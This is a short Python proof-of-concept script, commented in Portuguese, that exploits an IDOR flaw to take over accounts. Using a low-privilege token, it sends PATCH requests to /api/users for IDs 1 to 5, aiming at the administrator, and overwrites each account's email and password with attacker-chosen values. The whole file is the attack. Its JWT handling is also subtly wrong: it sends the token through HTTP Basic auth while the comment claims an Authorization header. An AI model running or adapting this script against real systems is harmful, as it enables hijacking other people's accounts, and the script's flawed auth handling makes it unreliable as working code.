import requests
from requests.auth import HTTPBasicAuth
import json

# Define o token JWT de um utilizador de testes comum (privilégios mínimos)
JWT_TOKEN = "YOUR_JWT_TOKEN" 


def auth_header():
  """Define o cabeçalho 'Authorization' para o token JWT."""
  auth = HTTPBasicAuth("your_username", JWT_TOKEN)
  return auth

def payload_data():
  """Define o payload JSON com os campos 'email' e 'senha'. """
  user_data = { 
    "email": "pwned@hacker.com", 
    "password": "Pwned123!" 
  }
  return json.dumps(user_data)

def check_account_takeover(server_url, user_id):
  """Envia um pedido PATCH para o endpoint e verifica se a resposta é OK."""
  try:
    response = requests.patch(f"{server_url}/api/users/{user_id}", 
                             auth=auth_header(), 
                             data=payload_data()
                            )

    # Verifica se o código de status foi 200 OK
    if response.status_code == 200: 
      print(f"Account Takeover por IDOR confirmado no endpoint (ID:{user_id})")  
    else:
      print(f"Erro ao tentar realizar o pedido - Status Code: {response.status_code}")

  except Exception as e: 
    print(f"An error occurred: {e}") 


# Define os IDs de teste (ID 1 a 5) para foco na conta de administrador
user_ids = [1, 2, 3, 4, 5]  

# Loop para executar as verificações para cada ID
for user_id in user_ids:
  check_account_takeover("http://localhost:8080", user_id) 


